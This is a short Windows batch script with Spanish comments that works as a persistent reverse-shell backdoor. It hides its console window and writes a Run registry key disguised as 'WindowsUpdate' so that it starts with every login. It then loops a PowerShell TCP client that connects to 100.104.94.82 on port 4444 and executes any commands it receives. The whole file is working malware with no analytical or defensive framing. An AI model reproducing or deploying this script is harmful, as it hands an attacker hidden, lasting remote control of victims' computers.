@echo off
:: Ocultar la ventana del CMD
if "%1" == "h" goto begin
start /min cmd.exe /c %0 h
goto end

:begin
:: Configuración de la reverse shell
set IP=100.104.94.82
set PORT=4444

:: Crear entrada de registro para persistencia
reg add "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run" /v "WindowsUpdate" /t REG_SZ /d "%COMSPEC% /c %~f0" /f

:: Bucle para reconexión automática
:loop
cmd.exe /c powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('%IP%',%PORT%);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"
ping -n 5 127.0.0.1 > nul
goto loop

:end
